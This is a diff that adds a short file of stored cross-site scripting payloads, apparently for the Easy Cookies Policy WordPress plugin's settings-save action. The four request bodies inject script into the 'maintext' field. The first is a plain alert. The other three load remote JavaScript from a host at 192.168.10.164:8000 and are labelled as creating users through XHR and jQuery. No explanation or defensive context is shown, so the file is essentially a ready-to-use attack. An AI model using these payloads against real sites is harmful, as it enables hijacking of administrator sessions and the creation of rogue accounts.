@@ -1,0 +1,11 @@
+#alert
+action=easy_cookies_policy_save_settings&maintext=<script>alert(1)</script>&background=black&transparency=90&close=accept&expires=365&enabled=true&display=fixed&position=top&button_text=Accept&text_color=#dddddd
+
+#Remote Alert
+action=easy_cookies_policy_save_settings&maintext=<script src='//192.168.10.164:8000/js/script_alert.js'></script>&background=black&transparency=90&close=accept&expires=365&enabled=true&display=fixed&position=top&button_text=Accept&text_color=#dddddd
+
+#Remote user creation via xhr
+action=easy_cookies_policy_save_settings&maintext=<script src='//192.168.10.164:8000/js/script_xhr.js'></script>&background=black&transparency=90&close=accept&expires=365&enabled=true&display=fixed&position=top&button_text=Accept&text_color=#dddddd
+
+#Remote user creation via jQuery
+action=easy_cookies_policy_save_settings&maintext=<script src='//192.168.10.164:8000/js/script_jQuery.js'></script>&background=black&transparency=90&close=accept&expires=365&enabled=true&display=fixed&position=top&button_text=Accept&text_color=#dddddd
